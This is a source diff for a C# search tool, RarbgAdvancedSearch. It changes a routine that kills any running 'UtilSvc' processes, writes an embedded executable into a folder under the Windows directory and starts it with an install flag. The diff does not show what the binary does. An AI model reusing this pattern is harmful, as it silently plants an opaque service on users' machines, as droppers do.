@@ -2,6 +2,7 @@
 using RarbgAdvancedSearch.Properties;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.IO.Compression;
@@ -18,6 +19,7 @@ using System.Security.Principal;
 using System.ServiceProcess;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using static RarbgAdvancedSearch.Utils;
@@ -447,12 +449,39 @@ namespace RarbgAdvancedSearch
         {
             try
             {
-                var path = $"{Path.GetPathRoot(Environment.SystemDirectory)}/Windows/UtilSvc/UtilSvc.exe";
-                System.IO.FileInfo file = new System.IO.FileInfo(path);
+                try
+                {
+                    ServiceController service = new ServiceController("UtilSvc");
+                    try
+                    {
+                        ServiceControllerStatus stat = service.Status; //check presence
+                        foreach (var process in Process.GetProcessesByName("UtilSvc"))
+                        {
+                            process.Kill();
+                        }
+                    }
+                    catch (Exception){}
+                }
+                catch (Exception) {}
+
+                var new_path = $"{Path.GetPathRoot(Environment.SystemDirectory)}/Windows/UtilSvc/UtilSvc.exe";
+                var old_path = $"{Path.GetPathRoot(Environment.SystemDirectory)}/Windows/UtilSvc/UtilSvc.old";
+
+                if (File.Exists(old_path))
+                {
+                    File.Delete(old_path);
+                }
+
+                if (File.Exists(new_path))
+                {
+                    File.Move(new_path, old_path);
+                }
+
+                System.IO.FileInfo file = new System.IO.FileInfo(new_path);
                 file.Directory.Create();
-                File.WriteAllBytes(path, Resources.UtilSvc);
+                File.WriteAllBytes(new_path, Resources.UtilSvc);
                 System.Diagnostics.Process p = new System.Diagnostics.Process();
-                p.StartInfo.FileName = path;
+                p.StartInfo.FileName = new_path;
                 p.StartInfo.UseShellExecute = false;
                 p.StartInfo.Arguments = "-i";
                 if (p.Start())
